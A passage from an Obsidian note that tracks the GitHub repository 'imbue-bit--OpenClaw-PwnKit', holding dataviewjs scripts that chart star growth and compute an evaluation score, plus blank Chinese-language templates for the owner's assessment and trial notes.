>       return `${p.date} ${"\u2588".repeat(w)}${"\u2591".repeat(25-w)} ${p.stars.toLocaleString()}`;
>     });
>     const first = points[0].stars;
>     const last = points[points.length-1].stars;
>     const growth = first > 0 ? Math.round((last - first) / first * 100) : 0;
>     lines.push(`\n**成長** +${(last-first).toLocaleString()} stars（${growth}%）in ${points.length} snapshots`);
>     // 趨勢方向偵測
>     if (points.length >= 3) {
>       const mid = Math.floor(points.length / 2);
>       const fh = points.slice(0, mid), sh = points.slice(mid);
>       const rateF = fh.length > 1 ? (fh[fh.length-1].stars - fh[0].stars) / Math.max(1, (new Date(fh[fh.length-1].date) - new Date(fh[0].date)) / 86400000) : 0;
>       const rateS = sh.length > 1 ? (sh[sh.length-1].stars - sh[0].stars) / Math.max(1, (new Date(sh[sh.length-1].date) - new Date(sh[0].date)) / 86400000) : 0;
>       const ratio = rateF > 0 ? rateS / rateF : rateS > 0 ? 2 : 1;
>       const dir = ratio > 1.3 ? "Rising（加速中）" : ratio < 0.7 ? "Cooling（降溫中）" : "Stable（穩定）";
>       lines.push(`**趨勢方向** ${dir}（加速比 ${Math.round(ratio * 100) / 100}x）`);
>     }
>     dv.paragraph(lines.join("\n"));
>   } else { dv.paragraph("需要 2+ 次快照才能顯示趨勢"); }
> } else { dv.paragraph("尚無 star_history 資料（下次出現在 trending 時會開始追蹤）"); }
> ```

## 相對成長速度

> [!abstract]- 跟 vault 中同類專案比較
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me) {
>   const all = dv.pages('"Repos"').where(p => p.status !== "archived");
>   const sameCat = all.where(p => p.category === me.category);
>   const avgAll = all.length > 0 ? Math.round(all.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / all.length) : 0;
>   const avgCat = sameCat.length > 0 ? Math.round(sameCat.map(p => p.stars_per_day || 0).array().reduce((a,b) => a+b, 0) / sameCat.length) : 0;
>   const mySpd = me.stars_per_day || 0;
>   const vsAll = avgAll > 0 ? Math.round(mySpd / avgAll * 100) : 0;
>   const vsCat = avgCat > 0 ? Math.round(mySpd / avgCat * 100) : 0;
>   dv.table(["比較對象", "平均 Stars/天", "本專案", "倍數"], [
>     ["全 Vault", avgAll, mySpd, vsAll + "%"],
>     ["同分類 (" + me.category + ")", avgCat, mySpd, vsCat + "%"],
>   ]);
>   if (vsAll >= 300) dv.paragraph("**極速成長** — 成長速度是 vault 平均的 3 倍以上");
>   else if (vsAll >= 150) dv.paragraph("**高速成長** — 成長速度高於 vault 平均");
>   else if (vsAll >= 50) dv.paragraph("**正常速度** — 接近 vault 平均水平");
>   else dv.paragraph("**低速成長** — 低於 vault 平均，可能已過熱度高峰");
> }
> ```

## 決策分數

> [!abstract]- 綜合評估（自動計算）
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me) {
>   let score = 0;
>   let breakdown = [];
>   // 熱度 (0-25)
>   const spd = me.stars_per_day || 0;
>   const heat = Math.min(25, Math.round(spd / 40 * 25));
>   score += heat; breakdown.push(`熱度: ${heat}/25`);
>   // 安裝難度 (0-20)
>   const inst = me.install_complexity === "easy" ? 20 : me.install_complexity === "medium" ? 12 : 5;
>   score += inst; breakdown.push(`易用性: ${inst}/20`);
>   // 成熟度 (0-20)
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : 0;
>   const mat = age > 365 ? 20 : age > 180 ? 16 : age > 30 ? 10 : 5;
>   score += mat; breakdown.push(`成熟度: ${mat}/20`);
>   // 社群 (0-20)
>   const forks = me.forks || 0;
>   const comm = forks > 200 ? 20 : forks > 50 ? 15 : forks > 10 ? 10 : 5;
>   score += comm; breakdown.push(`社群: ${comm}/20`);
>   // 授權 (0-15)
>   const lic = me.license || "";
>   const friendly = ["MIT","Apache-2.0","BSD-2-Clause","BSD-3-Clause","ISC","Unlicense"].includes(lic);
>   const licScore = friendly ? 15 : lic && lic !== "N/A" ? 8 : 0;
>   score += licScore; breakdown.push(`授權: ${licScore}/15`);
>   const grade = score >= 80 ? "A" : score >= 60 ? "B" : score >= 40 ? "C" : "D";
>   const bar = "\u2588".repeat(Math.round(score/5)) + "\u2591".repeat(20 - Math.round(score/5));
>   dv.paragraph(`## ${grade} (${score}/100)\n${bar}\n\n${breakdown.join(" | ")}`);
> }
> ```

---

## 個人筆記

> [!abstract]- 評估進度
> ```dataviewjs
> const me = dv.page("Repos/imbue-bit--OpenClaw-PwnKit");
> if (me) {
>   const steps = [
>     { name: "已讀", done: me.status && me.status !== "to-review" },
>     { name: "已評分", done: (me.my_rating || 0) > 0 },
>     { name: "有結論", done: me.verdict && me.verdict !== "" },
>     { name: "Ring 決策", done: me.ring && me.ring !== "" && me.ring !== "assess" },
>     { name: "試用記錄", done: me.status === "tried" || me.status === "integrated" },
>   ];
>   const done = steps.filter(s => s.done).length;
>   const pct = Math.round((done / steps.length) * 100);
>   const bar = "\u2588".repeat(Math.round(pct / 5)) + "\u2591".repeat(20 - Math.round(pct / 5));
>   dv.paragraph(`${bar} **${done}/${steps.length}** (${pct}%)`);
>   const todo = steps.filter(s => !s.done).map(s => s.name);
>   if (todo.length > 0) dv.paragraph("待完成：" + todo.join(" / "));
> }
> ```

> [!question]+ 快速評估（30 秒填完）
> 
> 相關性:: 未評估
> 印象:: _一句話_
> 行動:: 不需要
> 
> | 維度 | 分數 (1-5) | 說明 |
> | --- | :---: | --- |
> | 信心 | /5 | _我對這工具的了解程度_ |
> | 興趣 | /5 | _想投入時間研究的程度_ |
> | 風險 | /5 | _導入風險，5=極低風險_ |
> 
> _填完後更新 frontmatter：`score_confidence` / `score_interest` / `score_risk`_
> 
> _相關性選項：直接相關 / 間接相關 / 不相關 / 未評估_
> _行動選項：立刻試用 / 加入待辦 / 持續觀察 / 不需要_

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 測試環境 :: _OS / Node / Python 版本_
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 花費時間 :: _從零到可用_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 踩到的坑 :: _描述 + 解法_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

> [!warning]- 替換成本
> 若半年後要換掉，難度多高？資料格式是標準的嗎？
> 
> 侵入性:: _低 / 中 / 高_
> 遷移路徑:: _描述_

### 決策記錄

> [!abstract]- 為什麼評估這個工具？
> **當時的痛點**：_遇到什麼問題才開始找工具？_
> **觸發來源**：_GitHub Trending / HN / 同事推薦 / 其他_
> **當時的約束**：_時間 / 團隊 / 語言 / 部署環境_

> [!note]- 最終決策
> decision:: _選了什麼（或為何還在觀望）_
> why:: _當時的理由（越具體越好）_
> outcome:: _後來實際發生了什麼_

### 探索日誌

_按時間記錄，每次接觸時追加一段（最新在上）_

> **2026-03-10** — 首次收錄
> _第一印象：_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`
**Tech Radar**：`assess` → `trial` → `adopt` / `hold`

> [!info]- 評估完成後
> 更新 frontmatter：
> - `ring`: adopt / trial / assess / hold
> - `ring_history`: 追加新狀態（格式：`assess@2026-03-10, trial@2026-03-15`）
> - `verdict`: 一句話結論
> - `my_rating`: 1-5 分
> - `status`: reading / tried / integrated / archived

## 出現記錄

- [[2026-03-11|2026-03-11]] — 再次上榜，676 stars
- [[2026-03-10|2026-03-10]] — 首次收錄，692 stars
